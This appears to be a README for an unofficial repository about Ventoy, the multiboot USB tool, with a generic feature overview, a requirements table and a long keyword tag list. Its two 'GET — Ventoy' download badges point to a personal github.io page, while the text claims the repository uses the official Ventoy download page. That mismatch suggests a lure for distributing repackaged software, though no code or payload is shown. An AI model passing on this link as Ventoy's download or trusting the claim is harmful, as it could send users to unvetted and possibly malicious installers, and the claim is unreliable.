# Ventoy

<p align="center">
<img src="https://images.wondershare.com/recoverit/article/linux-bootable-usb-pic-4.jpg" alt="Ventoy 2026 Multiboot USB Tool" width="600">
</p>

[![GET — Ventoy](https://img.shields.io/badge/GET-Ventoy-2563eb?style=for-the-badge)](https://declanntt678210.github.io/.github/Ventoy-2026-Multiboot-USB-Tool)

---

# Project Overview

Ventoy is an open-source utility for creating bootable USB drives that can contain multiple ISO, WIM, IMG, VHD, and EFI image files.

Instead of rewriting a USB drive every time a different operating-system image is needed, Ventoy installs its boot environment once and allows users to copy supported image files directly to the USB storage.

When the computer boots from the Ventoy drive, a menu displays the available images so the user can select which one to start.

Ventoy is commonly used for operating-system installation, system recovery, diagnostics, maintenance environments, and testing different bootable images from a single USB device.

---

# Multiboot USB

Ventoy's main feature is its ability to store multiple bootable images on the same USB drive.

After installing Ventoy to a compatible USB device, users can copy ISO files to the data partition using normal file-management tools.

There is no need to recreate the bootable USB whenever another supported image is added or removed.

This makes Ventoy useful for maintaining a portable collection of Windows installers, Linux distributions, recovery environments, diagnostic tools, and other bootable utilities.

---

# ISO, WIM, IMG & VHD Support

Ventoy supports multiple image formats and boot methods.

Supported image types include:

* ISO
* WIM
* IMG
* VHD
* VHDX
* EFI

Compatibility depends on the specific image and boot configuration.

Ventoy also supports many Windows and Linux distributions and provides mechanisms for handling images that require special boot configurations.

---

# UEFI, BIOS & Secure Boot

Ventoy supports both traditional BIOS systems and modern UEFI systems.

The project also provides Secure Boot support for compatible systems, allowing users to boot supported images on computers where Secure Boot is enabled.

Secure Boot behavior can depend on firmware configuration, image compatibility, and the particular Ventoy version.

For systems using Secure Boot, users should follow Ventoy's official installation and enrollment instructions rather than changing firmware security settings unnecessarily.

---

# Persistence & Advanced Features

Ventoy supports persistence for compatible Linux distributions, allowing selected live Linux environments to retain changes between reboots.

The project also provides advanced configuration features such as:

* Persistence
* Auto installation
* VentoyPlugson
* Menu themes
* ISO injection
* File injection
* Custom boot menus
* Password protection
* Boot configuration
* Plugin support

These features allow Ventoy to be adapted for more specialized deployment and maintenance workflows.

---

# Windows & Linux Deployment

Ventoy can be used to maintain installation media for multiple operating systems on a single USB device.

A single drive can contain different Windows installation images alongside multiple Linux distributions and recovery environments, subject to the available storage capacity and image compatibility.

This can be useful for technicians, system administrators, developers, and users who regularly reinstall or troubleshoot computers.

---

# 2026 Updates

Ventoy continues to receive development releases throughout 2026, with improvements to operating-system compatibility, boot methods, Secure Boot, persistence, plugins, and support for newer ISO images.

The exact current version can change during the year, so this repository uses the official Ventoy download page rather than hard-coding an unverified 2026 release number.

The official project provides Windows and Linux packages as well as source code and documentation for advanced users.

---

# System Compatibility & Performance

| Component        | Minimum Practical Configuration                            |
| ---------------- | ---------------------------------------------------------- |
| Operating System | Windows 7 / 8 / 10 / 11 or Linux                           |
| Processor        | x86/x64 or compatible UEFI/BIOS system                     |
| Memory           | 1 GB RAM minimum; 2 GB+ recommended                        |
| USB Storage      | 8 GB minimum; 32 GB+ recommended for multiboot collections |
| File System      | exFAT, NTFS, FAT32 and other supported formats             |
| Firmware         | BIOS / UEFI                                                |
| Secure Boot      | Supported on compatible systems                            |
| Internet         | Required to download ISO/images; not required for booting  |

Ventoy itself requires relatively little system memory because most of the storage is used by the bootable image files placed on the USB drive.

USB 3.x storage is recommended when working with large operating-system images or running live environments directly from the Ventoy drive.

---

[![GET — Ventoy](https://img.shields.io/badge/GET-Ventoy-2563eb?style=for-the-badge)](https://declanntt678210.github.io/.github/Ventoy-2026-Multiboot-USB-Tool)

---

# Tags

Ventoy, Ventoy 2026, multiboot USB, bootable USB, ISO boot, USB installer, Windows installer, Linux installer, multiboot tool, ISO manager, UEFI boot, BIOS boot, Secure Boot, Windows PE, Linux live USB, recovery USB, system recovery, boot manager, USB utility, portable OS, persistence

---

